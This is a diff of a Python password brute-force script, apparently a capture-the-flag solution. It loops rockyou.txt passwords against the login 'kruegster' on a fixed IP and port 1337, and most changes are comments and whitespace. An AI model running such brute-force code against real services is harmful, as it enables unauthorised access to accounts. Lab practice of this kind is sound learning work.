@@ -35,6 +35,9 @@ from threading import Thread, Lock
 
 host = "142.93.117.193" # IP address here
 port = 1337 # Port here
+
+
+# Change this to the location of your rockyou.txt
 wordlist = "/home/justin/rockyou.txt" # Point to wordlist file
 
 class Manager:
@@ -78,19 +81,18 @@ def brute_force():
         while line:
             login(username, line.strip("\n"))
             line = fp.readline()
-    """
 
+
+
+    # Failed attempt at multithreading
+    """
     manager = Manager()
     start_threads(manager)
     """
 
-def run_thread(callback):
-   
-
- 
+def run_thread(callback): 
     password = callback.get()
-   
-    username = "kruegster"   # Hint: use OSINT
+    username = "kruegster"
 
     if password != None:
         login(username, password.strip("\n"))
@@ -99,12 +101,11 @@ def run_thread(callback):
         return
 
 def start_threads(callback):
-    num_threads =1 
+    num_threads = 1 
 
     threads = []
 
     for num in range(0, num_threads):
-
         thread = Thread(target = run_thread, args=(callback,))
         threads.append(thread)
         thread.start()
